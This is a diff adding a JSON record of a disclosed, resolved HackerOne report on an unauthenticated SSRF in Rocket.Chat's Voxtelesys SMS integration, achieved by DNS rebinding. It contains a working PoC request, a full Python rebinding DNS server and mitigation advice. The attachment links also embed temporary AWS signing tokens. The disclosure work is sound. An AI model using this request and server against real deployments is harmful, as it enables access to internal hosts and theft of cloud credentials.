@@ -1,0 +1,199 @@
+{
+  "id": 3473145,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDczMTQ1",
+  "url": "https://hackerone.com/reports/3473145",
+  "title": "Unauthenticated SSRF in Voxtelesys integration ('checkUrlForSsrf' Bypass via DNS rebinding)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-12-20T04:13:20.447Z",
+  "submitted_at": "2025-12-20T04:13:20.860Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "button142857",
+    "url": "/button142857",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-39713"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-29T01:48:49.623Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-29T00:15:36.396Z",
+  "team_member_agreed_on_going_public_at": "2026-07-29T01:48:49.129Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nRocket.Chat version 7.13.2 contains an SSRF vulnerability caused by a DNS rebinding attack, which allows access to internal hosts and reading of their responses.\nThis issue further bypasses the fix for CVE-2024-39713.\n\nRocket.Chat provides SMS integration features using Twilio and Voxtelesys, which can be used to access external media and retrieve files. During this process, the `checkUrlForSsrf` function is used to verify that a URL does not point to an internal host. However, this function is vulnerable to DNS rebinding attacks, and when a URL whose domain is controlled by an attacker is submitted, the check can be bypassed, potentially allowing access to internal hosts that would otherwise be unreachable.\n\n**Details:**\nIn my test environment, I set up an httpbin server on the same LAN as the Rocket.Chat server.\nThe httpbin server is running at 192.168.100.14:80, and an attacker cannot reach this server directly from outside. \nIn addition, a DNS server for performing a DNS rebinding attack was deployed within the same LAN, and the Rocket.Chat server was configured to use it for name resolution. \nWhen resolving the name `conamikan.test`, the DNS server returns an external server address (1.1.1.1) with TTL=0 on the first request, and returns 192.168.100.14 on the second and subsequent requests. All other DNS queries are forwarded to 8.8.8.8. The specific implementation is provided in the attachment.\nIn a realistic scenario, when accessing a domain controlled by an attacker, name resolution would be performed by the attacker’s DNS server. Therefore, this environment is sufficient for verifying DNS rebinding attacks.\n\nStep 0: \nAs a prerequisite, Voxtelesys must be enabled in the SMS settings.\n{F5138160}\n\nStep 1: \nAn attacker can trigger the SSRF by executing the following script. No authentication is required. (Set <Rocket.Chat hostIP> according to your environment.)\n```\nPOST \"http://<Rocket.Chat hostIP>/api/v1/livechat/sms-incoming/voxtelesys\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"from\": \"+15551112222\",\n    \"to\": \"+15550001111\",\n    \"body\": \"Hello from Voxtelesys\",\n    \"received_at\": \"2024-01-01T00:00:00Z\",\n    \"media\": [\n      \"http://conamikan.test\"\n    ]\n  }'\n```\nAt this point, an SSRF request to the internal server has already been performed.\n{F5138169}\n\nStep 2: \nA LiveChat agent user can download and view the response from the chat room.\n{F5138172}\n\n**PoC:**\n{F5138175}\n\n## Root Cause:\nIn the `getUploadFile` function in `sms.ts`, which is used by this feature, the URL provided by the user is first checked by the `checkUrlForSsrf` function, and then the file is retrieved using the`fetch` function.\n{F5138179}\nWithin the `checkUrlForSsrf` function, `nslookup` is used to verify whether the IP address associated with the domain is valid or not.\n{F5138180}\n\nHowever, in a DNS rebinding attack, the TTL of the DNS response is set to 0 (or an extremely small value). As a result, during the initial nslookup, `conamikan.test` resolves to `1.1.1.1` and passes the check. When the file is fetched, the cache cannot be used and name resolution is performed again. At that time, `conamikan.test` is resolved to `192.168.100.14` by the attacker’s DNS server. Since the check has already been passed, access to the internal server is performed without further validation.\nCompletely mitigating DNS rebinding attacks is difficult, and it is generally recommended to avoid making outbound requests to arbitrary URLs whenever possible. However, if such a feature is required, the following mitigation measures should be implemented:\n* Allow only HTTPS URLs\n* For HTTP, use the IP address resolved during the initial nslookup directly\n* Reject DNS responses with extremely small TTL values\n\n\n** attachment **\nBelow is the script for the DNS server used in the verification.\nWhen building the environment with Docker, you can run this in a container on the same LAN and perform the verification by configuring this server as the DNS for the Rocket.Chat container.\n```\nfrom dnslib import DNSRecord, QTYPE, RR, A\nfrom dnslib.server import DNSServer\nimport socket\nimport time\n\n# settings\nDOMAIN = \"conamikan.test.\"  # attacker's domein\nGLOBAL_IP = \"1.1.1.1\"   # something valid IP address\nTARGET_IP = \"192.168.100.14\" # internal IP address\nUPSTREAM_DNS = \"8.8.8.8\"    # Forwarding destination(Google DNS server)\n\nclass RebindResolver:\n    def __init__(self):\n        # Initialize count as an instance variable\n        self.request_count = 0\n        self.reset_timer = time.perf_counter()\n\n    def resolve(self, request, handler):\n        # Reset self.request_count every 5 seconds\n        if (time.perf_counter() - self.reset_timer) > 5:\n            self.request_count = 0\n            self.reset_timer = time.perf_counter()\n\n        qname = str(request.q.qname).strip(\".\")\n        target_domain = DOMAIN.strip(\".\")\n\n        # Only for conamikan.test\n        if qname == target_domain:\n            reply = request.reply()\n            \n            # Return GLOBAL_IP only when self.request_count is 0\n            if self.request_count == 0:\n                ip = GLOBAL_IP\n            else:\n                ip = TARGET_IP\n            \n            self.request_count += 1\n            \n            # TTL is 0\n            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))\n            print(f\"[*] [REBIND] {qname} -> {ip} (Count: {self.request_count})\")\n            return reply\n\n        # Forward other domains to Google DNS\n        else:\n            try:\n                proxy_req = request.pack()\n                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                sock.settimeout(2.0)\n                sock.sendto(proxy_req, (UPSTREAM_DNS, 53))\n                \n                data, _ = sock.recvfrom(512)\n                print(f\"[+] [FORWARD] {qname} to {UPSTREAM_DNS}\")\n                return DNSRecord.parse(data)\n            except Exception as e:\n                print(f\"[!] [ERROR] Failed to forward {qname}: {e}\")\n                return request.reply()\n\nif __name__ == \"__main__\":\n    resolver = RebindResolver()\n    server = DNSServer(resolver, port=53, address=\"0.0.0.0\")\n    print(f\"DNS Server started. Rebinding: {DOMAIN}, Forwarding: {UPSTREAM_DNS}\")\n    server.start()\n```\n\n## Impact\n\nThis enables an attacker to reach internal network resources that would normally be inaccessible and to perform network scanning. Because an attacker can receive responses from internal hosts, the risk of data leakage is very high and requires immediate remediation. The same technique can also be used to access cloud services and metadata endpoints, potentially exposing sensitive cloud-side data and credentials, so there is a significant risk of cloud information leakage.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5138160,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1pbiv4odqsmohtuya0h24m6uy9x0?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fe62b827d4aedff40e3ee5cfafebbaa4667e7eb1716342889f73285b5b15a0ac",
+      "file_size": 169664,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5138169,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mpcvbjmeccau362zla5g4dr79yai?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3fecadf9653d7e3ae31d5bd314e772e76f52f9611eeb72ab9b6777f608fd61fe",
+      "file_size": 94680,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5138172,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vd4rzj77cbcwrkoqskibhvt7yapc?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e72e9314a4d02377f368ca9c4753e08f41fe6eaaceb094eb1d09e483746037c9",
+      "file_size": 356326,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5138175,
+      "file_name": "PoC_DNSrebinding.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e4xw4x1pvyf3s4bb5w9orjugb1dc?response-content-disposition=attachment%3B%20filename%3D%22PoC_DNSrebinding.mp4%22%3B%20filename%2A%3DUTF-8%27%27PoC_DNSrebinding.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fd71c43c39c5894496e5847dd004ed6406e2ea1df4e8d49732f9e8348dfb4d96",
+      "file_size": 11137812,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 5138179,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f67knsyjbzopoxv8owgi2sd0ulaa?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0af6b743ce9db09e9cee4a0c4d7e4ff38de95260d2e3922907ea6a12f4324c4a",
+      "file_size": 92764,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5138180,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qq2s1u9kl81n0z9i6tcuzfbmkgvq?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQUQ2WITK%2F20260729%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260729T024238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFpGGEyoN%2FtYIVofnZHOELBCOXT64OkkXgUmldBxbJbHAiAM5cLfFZ5up9Rt2Clb%2Fs9xeT0bn75tZcG6zuzsbA5whiqyBQhzEAMaDDAxMzYxOTI3NDg0OSIMSCLUrfxCBDGslx0UKo8FPUBotRrj7eZow6N2teuSrhT6LJe7G83zmtca2ARCD5wQEtqH%2Fx64mq3pSUq5CAXglQHGG41Lqr4UKSGrH%2BujZeLq4T786%2FSiBjGVYfyQT%2FR6GUop3KGea3Hdm%2BLk31PaRCZD3IrmcTc03u1jLpXhiTkwUBla5V8WSDsda4qG7Zh%2F%2FaXFrtL5Bk1znoV26qOD7ETh4z47Wm3D8auOTPu%2BD2xPgx7iUP2xVGgmT280qv5mgqOPoCfG6OfcQ9aD80LDFjJ6Rcs4ND1iayv1B2BfQmqVPOn0O389QLXYyfiZNMiVKl7ll%2BQDmS4uRVpeIdOPTqh5K99pdP2vPQ3gQL7IWuCaoKqqSNgCmj7%2FlQyD2O6L%2B2xHz1owa5%2FnVSqLcc%2Bzn9nnJ3t%2Fn07xl49WDd4qjioKgfOOD5TRB6kZybQinWrQA05nqMv2vZuktODn%2FpT1kz8gyuXmuKDCZi61lupvXZirpos1yn5HJmpJFcEXrDnUoPdElIGo6Nro1ssXxGmJhcbAKZcjWsXek3xQ1XEVGni5HeX6yjBT0pBJn93ukl%2FO3S7Vo3SrieXMk9DFtXTUyDggna8fm2qmp4RNN8gVWT4qPnyQ4yIa2ODr3TzcuDgjPZWmXovh0WvFoMOi2ucZ4YMFSf%2BKA7twHU1GzjYeDII02rWGKDHskAp73raSjNu2UOHh1Yraom01wELsbFZFi2if3qorDwdx1sXUTsnZhDQq7qugc%2BftMIh2gU1bzLWhfH0Sy9YrAASlHX4s8VmQ1UDTtiPLl0cHx5kuJ8pMQ9JGlOtDAYKONDVBwK9ojChGTUL528SoPjOaw%2F1kjX9MlqnQO3oqwurDwsq2RlZi2zNlTc4baIINxLk8kmN6DDDvt6XTBjqyAUrzIhf%2BLLwj5%2Btv2YvtZ3QhOI6h0FVViJwWOV6AC9V%2F9kNxXPZV%2Bc%2BUgmMjY1AjK2Ldc2IccikM%2F3DDUEbC4WsDwikCkGZiwh4yfG1YqT6vSxOqZ%2BMz4slNwSrabssw0Kk6EgnvLGGGIQNV%2BcacIbbCAi2Kp3kNMfYomD6ep8Hka5Gu477rutgm1IQDoasEdHnrH2umU17JkKkPp%2BTkpkk0epPn5xESQm9fTP6PpT7bsuw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d352d8f92529b8ff7e48ed7b0625cb13077d2110fdaf756bb61cffd9f366d1c2",
+      "file_size": 297355,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-08-28T00:15:37.107Z",
+  "allow_singular_disclosure_after": 2583178.983967304,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 293351,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/RocketChat/Rocket.Chat",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
